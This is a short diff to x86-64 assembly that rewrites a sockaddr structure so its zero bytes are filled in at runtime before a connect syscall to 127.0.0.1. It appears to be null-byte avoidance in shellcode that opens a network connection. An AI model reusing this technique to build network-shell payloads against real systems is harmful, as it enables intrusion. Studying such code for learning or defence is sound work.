@@ -9,8 +9,9 @@ eol:
     .byte 0xff
 sockaddr:
 	.byte 2
-	.byte 0
+	.byte 0xff
 	.word 4391
+    .long 0xffffffff
 	.byte 127
 	.byte 0
 	.byte 0
@@ -41,8 +42,14 @@ next:
 	movb $42, %al
 
 	leaq sockaddr(%rip), %rsi
-	# sizof(struct sockaddr)
 	xorl %edx, %edx
+    # put zeroes in sockaddr
+    movq %rsi, %r8
+    inc %r8
+    movb %dl, (%r8)
+    addq $3, %r8
+    movl %edx, (%r8)
+	# sizof(struct sockaddr)
 	movb $16, %dl
 
 	syscall
